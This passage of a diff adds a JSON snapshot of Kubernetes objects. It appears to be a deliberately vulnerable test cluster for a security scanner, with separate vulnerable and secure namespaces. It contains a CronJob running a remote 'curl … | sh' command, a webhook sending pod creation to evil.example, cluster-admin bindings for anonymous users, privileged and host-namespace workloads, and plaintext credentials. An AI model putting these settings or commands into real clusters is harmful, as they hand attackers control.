+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "prio-vuln-exposed-lxt7bcwllq-vfdlv",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-vuln-exposed"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "prio-vuln-exposed-lxt7bcwllq",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "nginx:1.14.0",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "100m",
+        "memory": "64Mi"
+       },
+       "requests": {
+        "cpu": "10m",
+        "memory": "16Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.42",
+    "podIPs": [
+     {
+      "ip": "10.244.0.42"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "neg-api-ktxknd2qlw-pm9rc",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-api"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "neg-api-ktxknd2qlw",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "neg-api-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.43",
+    "podIPs": [
+     {
+      "ip": "10.244.0.43"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  }
+ ],
+ "daemonsets": [
+  {
+   "apiVersion": "apps/v1",
+   "kind": "DaemonSet",
+   "metadata": {
+    "name": "wl-host-network",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-network"
+    }
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-network"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-network"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "hostNetwork": true
+     }
+    }
+   }
+  }
+ ],
+ "statefulsets": [
+  {
+   "apiVersion": "apps/v1",
+   "kind": "StatefulSet",
+   "metadata": {
+    "name": "wl-host-ipc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-ipc"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "serviceName": "wl-host-ipc",
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-ipc"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-ipc"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "hostIPC": true
+     }
+    }
+   }
+  }
+ ],
+ "cronjobs": [
+  {
+   "apiVersion": "batch/v1",
+   "kind": "CronJob",
+   "metadata": {
+    "name": "wl-cronjob-privileged",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-cronjob-privileged"
+    }
+   },
+   "spec": {
+    "schedule": "*/10 * * * *",
+    "jobTemplate": {
+     "spec": {
+      "template": {
+       "metadata": {
+        "labels": {
+         "app": "wl-cronjob-privileged"
+        }
+       },
+       "spec": {
+        "automountServiceAccountToken": false,
+        "securityContext": {
+         "runAsNonRoot": true,
+         "runAsUser": 10001,
+         "seccompProfile": {
+          "type": "RuntimeDefault"
+         }
+        },
+        "containers": [
+         {
+          "name": "app",
+          "image": "registry.k8s.io/pause:3.9",
+          "securityContext": {
+           "allowPrivilegeEscalation": true,
+           "readOnlyRootFilesystem": true,
+           "capabilities": {
+            "drop": [
+             "ALL"
+            ]
+           },
+           "privileged": true
+          },
+          "resources": {
+           "limits": {
+            "cpu": "250m",
+            "memory": "128Mi"
+           },
+           "requests": {
+            "cpu": "50m",
+            "memory": "64Mi"
+           }
+          }
+         }
+        ],
+        "restartPolicy": "Never"
+       }
+      }
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "batch/v1",
+   "kind": "CronJob",
+   "metadata": {
+    "name": "gap-cron-curl-sh",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-cron-curl-sh"
+    }
+   },
+   "spec": {
+    "schedule": "*/10 * * * *",
+    "jobTemplate": {
+     "spec": {
+      "template": {
+       "metadata": {
+        "labels": {
+         "app": "gap-cron-curl-sh"
+        }
+       },
+       "spec": {
+        "automountServiceAccountToken": false,
+        "securityContext": {
+         "runAsNonRoot": true,
+         "runAsUser": 10001,
+         "seccompProfile": {
+          "type": "RuntimeDefault"
+         }
+        },
+        "containers": [
+         {
+          "name": "app",
+          "image": "registry.k8s.io/pause:3.9",
+          "securityContext": {
+           "allowPrivilegeEscalation": false,
+           "readOnlyRootFilesystem": true,
+           "capabilities": {
+            "drop": [
+             "ALL"
+            ]
+           }
+          },
+          "resources": {
+           "limits": {
+            "cpu": "250m",
+            "memory": "128Mi"
+           },
+           "requests": {
+            "cpu": "50m",
+            "memory": "64Mi"
+           }
+          },
+          "command": [
+           "/bin/sh",
+           "-c",
+           "curl -s http://198.51.100.9/x.sh | sh"
+          ]
+         }
+        ],
+        "restartPolicy": "Never"
+       }
+      }
+     }
+    }
+   }
+  }
+ ],
+ "jobs": [
+  {
+   "apiVersion": "batch/v1",
+   "kind": "Job",
+   "metadata": {
+    "name": "wl-job-host-network",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-job-host-network"
+    }
+   },
+   "spec": {
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-job-host-network"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "hostNetwork": true,
+      "restartPolicy": "Never"
+     }
+    }
+   }
+  }
+ ],
+ "clusterroles": [
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-wildcard-verbs"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "pods"
+     ],
+     "verbs": [
+      "*"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-wildcard-resources"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "get"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-god-mode"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "*"
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "*"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-secret-reader"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "secrets"
+     ],
+     "verbs": [
+      "get",
+      "list"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-escalator"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "rbac.authorization.k8s.io",
+      ""
+     ],
+     "resources": [
+      "clusterroles",
+      "users"
+     ],
+     "verbs": [
+      "bind",
+      "escalate",
+      "impersonate"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-event-cleaner"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "events"
+     ],
+     "verbs": [
+      "delete"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-configmap-writer"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "configmaps"
+     ],
+     "verbs": [
+      "patch",
+      "update"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-pod-creator"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "pods"
+     ],
+     "verbs": [
+      "create"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-pv-creator"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "persistentvolumes"
+     ],
+     "verbs": [
+      "create"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-node-proxy"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "nodes/proxy"
+     ],
+     "verbs": [
+      "get"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-csr-approver"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "certificates.k8s.io"
+     ],
+     "resources": [
+      "certificatesigningrequests/approval"
+     ],
+     "verbs": [
+      "update"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-webhook-editor"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "admissionregistration.k8s.io"
+     ],
+     "resources": [
+      "validatingwebhookconfigurations"
+     ],
+     "verbs": [
+      "update",
+      "patch"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "dvka-token-minter"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "serviceaccounts/token"
+     ],
+     "verbs": [
+      "create"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "cluster-admin",
+    "labels": {
+     "kubernetes.io/bootstrapping": "rbac-defaults"
+    }
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "*"
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "*"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "admin",
+    "labels": {
+     "kubernetes.io/bootstrapping": "rbac-defaults"
+    }
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "*"
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "get",
+      "list",
+      "create",
+      "update",
+      "delete"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "edit",
+    "labels": {
+     "kubernetes.io/bootstrapping": "rbac-defaults"
+    }
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "*"
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "get",
+      "list",
+      "create",
+      "update"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRole",
+   "metadata": {
+    "name": "view",
+    "labels": {
+     "kubernetes.io/bootstrapping": "rbac-defaults"
+    }
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      "*"
+     ],
+     "resources": [
+      "*"
+     ],
+     "verbs": [
+      "get",
+      "list"
+     ]
+    }
+   ]
+  }
+ ],
+ "clusterrolebindings": [
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "dvka-default-sa-admin"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "cluster-admin"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "default",
+     "namespace": "dvka-vuln"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "dvka-alice-admin"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "cluster-admin"
+   },
+   "subjects": [
+    {
+     "kind": "User",
+     "name": "alice@corp.example",
+     "apiGroup": "rbac.authorization.k8s.io"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "dvka-everyone-admin"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "cluster-admin"
+   },
+   "subjects": [
+    {
+     "kind": "Group",
+     "name": "system:authenticated",
+     "apiGroup": "rbac.authorization.k8s.io"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "dvka-anonymous-admin"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "cluster-admin"
+   },
+   "subjects": [
+    {
+     "kind": "User",
+     "name": "system:anonymous",
+     "apiGroup": "rbac.authorization.k8s.io"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "dvka-masters"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "view"
+   },
+   "subjects": [
+    {
+     "kind": "Group",
+     "name": "system:masters",
+     "apiGroup": "rbac.authorization.k8s.io"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "ClusterRoleBinding",
+   "metadata": {
+    "name": "ap-frontend-secrets"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "dvka-secret-reader"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "ap-frontend-sa",
+     "namespace": "dvka-vuln"
+    }
+   ]
+  }
+ ],
+ "rolebindings": [
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "name": "dvka-sa-edit",
+    "namespace": "dvka-vuln"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "edit"
+   },
+   "subjects": [
+    {
+     "kind": "Group",
+     "name": "system:serviceaccounts:dvka-vuln",
+     "apiGroup": "rbac.authorization.k8s.io"
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "name": "dvka-pod-reader-binding",
+    "namespace": "dvka-secure"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "Role",
+    "name": "dvka-pod-reader"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "reader-sa",
+     "namespace": "dvka-secure"
+    }
+   ]
+  }
+ ],
+ "roles": [
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "Role",
+   "metadata": {
+    "name": "dvka-ns-wildcard",
+    "namespace": "dvka-vuln"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "pods"
+     ],
+     "verbs": [
+      "*"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "Role",
+   "metadata": {
+    "name": "dvka-pod-reader",
+    "namespace": "dvka-secure"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "pods"
+     ],
+     "verbs": [
+      "get",
+      "list"
+     ]
+    }
+   ]
+  },
+  {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "Role",
+   "metadata": {
+    "name": "dvka-ns-secret-reader",
+    "namespace": "dvka-vuln"
+   },
+   "rules": [
+    {
+     "apiGroups": [
+      ""
+     ],
+     "resources": [
+      "secrets"
+     ],
+     "verbs": [
+      "get",
+      "list"
+     ]
+    }
+   ]
+  }
+ ],
+ "serviceaccounts": [
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "reader-sa",
+    "namespace": "dvka-secure"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "shared-sa",
+    "namespace": "dvka-vuln"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "shared-sa",
+    "namespace": "dvka-baseline"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "pair-sa",
+    "namespace": "dvka-secure"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "ap-frontend-sa",
+    "namespace": "dvka-vuln"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "neg-api-sa",
+    "namespace": "dvka-secure"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "default",
+    "namespace": "default"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "default",
+    "namespace": "dvka-baseline"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "default",
+    "namespace": "dvka-egress-open"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "default",
+    "namespace": "dvka-secure"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ServiceAccount",
+   "metadata": {
+    "name": "default",
+    "namespace": "dvka-vuln"
+   }
+  }
+ ],
+ "services": [
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "net-nodeport",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "NodePort",
+    "selector": {
+     "app": "wl-privileged"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080,
+      "nodePort": 31080
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "net-lb-open",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "LoadBalancer",
+    "selector": {
+     "app": "wl-latest-tag"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "kubernetes-dashboard",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "NodePort",
+    "selector": {
+     "app": "kubernetes-dashboard"
+    },
+    "ports": [
+     {
+      "port": 8443,
+      "targetPort": 8443,
+      "nodePort": 30443
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "neg-clusterip",
+    "namespace": "dvka-secure"
+   },
+   "spec": {
+    "type": "ClusterIP",
+    "selector": {
+     "app": "neg-api"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "neg-lb-restricted",
+    "namespace": "dvka-secure"
+   },
+   "spec": {
+    "type": "LoadBalancer",
+    "selector": {
+     "app": "neg-api"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ],
+    "loadBalancerSourceRanges": [
+     "203.0.113.0/24"
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "ap-frontend",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "LoadBalancer",
+    "selector": {
+     "app": "ap-frontend"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "prio-isolated",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "ClusterIP",
+    "selector": {
+     "app": "prio-isolated"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "prio-vuln-exposed",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "type": "LoadBalancer",
+    "selector": {
+     "app": "prio-vuln-exposed"
+    },
+    "ports": [
+     {
+      "port": 8080,
+      "targetPort": 8080
+     }
+    ]
+   }
+  }
+ ],
+ "ingresses": [
+  {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "name": "net-ingress-plain",
+    "namespace": "dvka-vuln"
+   },
+   "spec": {
+    "rules": [
+     {
+      "host": "plain.dvka.example",
+      "http": {
+       "paths": [
+        {
+         "path": "/",
+         "pathType": "Prefix",
+         "backend": {
+          "service": {
+           "name": "net-lb-open",
+           "port": {
+            "number": 8080
+           }
+          }
+         }
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "name": "neg-ingress-tls",
+    "namespace": "dvka-secure"
+   },
+   "spec": {
+    "tls": [
+     {
+      "hosts": [
+       "secure.dvka.example"
+      ],
+      "secretName": "tls"
+     }
+    ],
+    "rules": [
+     {
+      "host": "secure.dvka.example",
+      "http": {
+       "paths": [
+        {
+         "path": "/",
+         "pathType": "Prefix",
+         "backend": {
+          "service": {
+           "name": "neg-clusterip",
+           "port": {
+            "number": 8080
+           }
+          }
+         }
+        }
+       ]
+      }
+     }
+    ]
+   }
+  }
+ ],
+ "configmaps": [
+  {
+   "apiVersion": "v1",
+   "kind": "ConfigMap",
+   "metadata": {
+    "name": "sec-cm-password",
+    "namespace": "dvka-vuln"
+   },
+   "data": {
+    "db_password": "hunter2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ConfigMap",
+   "metadata": {
+    "name": "sec-cm-apikey",
+    "namespace": "dvka-vuln"
+   },
+   "data": {
+    "settings": "api_key=AKIAIOSFODNN7EXAMPLE"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ConfigMap",
+   "metadata": {
+    "name": "neg-app-config",
+    "namespace": "dvka-secure"
+   },
+   "data": {
+    "log_level": "info",
+    "region": "eu-west-1"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "ConfigMap",
+   "metadata": {
+    "name": "fp-model-config",
+    "namespace": "dvka-secure"
+   },
+   "data": {
+    "max_tokens": "256"
+   }
+  }
+ ],
+ "secrets": [
+  {
+   "apiVersion": "v1",
+   "kind": "Secret",
+   "metadata": {
+    "name": "db-credentials",
+    "namespace": "dvka-secure"
+   },
+   "type": "Opaque",
+   "stringData": {
+    "password": "placeholder-not-a-real-secret"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Secret",
+   "metadata": {
+    "name": "db-credentials",
+    "namespace": "dvka-vuln"
+   },
+   "type": "Opaque",
+   "stringData": {
+    "password": "S3cr3t-Passw0rd!"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Secret",
+   "metadata": {
+    "name": "legacy-sa-token",
+    "namespace": "dvka-vuln",
+    "annotations": {
+     "kubernetes.io/service-account.name": "default"
+    }
+   },
+   "type": "kubernetes.io/service-account-token"
+  }
+ ],
+ "mutatingwebhookconfigurations": [
+  {
+   "apiVersion": "admissionregistration.k8s.io/v1",
+   "kind": "MutatingWebhookConfiguration",
+   "metadata": {
+    "name": "dvka-sidecar-injector"
+   },
+   "webhooks": [
+    {
+     "name": "inject.dvka.example",
+     "failurePolicy": "Ignore",
+     "sideEffects": "None",
+     "admissionReviewVersions": [
+      "v1"
+     ],
+     "clientConfig": {
+      "url": "https://evil.example/mutate"
+     },
+     "rules": [
+      {
+       "apiGroups": [
+        ""
+       ],
+       "apiVersions": [
+        "v1"
+       ],
+       "operations": [
+        "CREATE"
+       ],
+       "resources": [
+        "pods"
+       ]
+      }
+     ]
+    }
+   ]
+  }
+ ],
+ "endpointslices": [
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "net-nodeport-q7svt",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "net-nodeport"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.3"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "wl-privileged-zxr89df2x8-jpflj",
+      "namespace": "dvka-vuln"
+     }
+    }
+   ]
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "net-lb-open-8kxb2",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "net-lb-open"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.19"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "wl-latest-tag-g9b5nhndlt-kzwhw",
+      "namespace": "dvka-vuln"
+     }
+    }
+   ]
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "kubernetes-dashboard-7r78k",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "kubernetes.io/service-name": "kubernetes-dashboard"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": []
+  },
+  {
+   "apiVersion": "discovery.k8s.io/v1",
+   "kind": "EndpointSlice",
+   "metadata": {
+    "name": "neg-clusterip-mqs4k",
+    "namespace": "dvka-secure",
+    "labels": {
+     "kubernetes.io/service-name": "neg-clusterip"
+    }
+   },
+   "addressType": "IPv4",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.244.0.43"
+     ],
+     "conditions": {
+      "ready": true
+     },
+     "targetRef": {
+      "kind": "Pod",
+      "name": "neg-api-ktxknd2qlw-pm9rc",
+      "namespace": "dvka-secure"
+     }
+    }
+   ]
+  },
